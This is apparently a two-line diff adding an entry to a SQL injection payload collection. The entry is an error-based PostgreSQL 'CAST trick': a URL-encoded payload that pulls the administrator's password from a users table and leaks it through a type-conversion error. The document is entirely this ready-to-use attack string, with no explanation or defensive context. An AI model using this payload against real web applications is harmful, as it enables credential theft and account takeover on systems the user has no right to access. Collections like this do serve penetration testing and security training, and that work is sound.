@@ -1,0 +1,2 @@
+Error-based (PostgreSQL CAST trick)
+CAST((SELECT+password+FROM+users+WHERE+username%3d'administrator')+AS+INT)
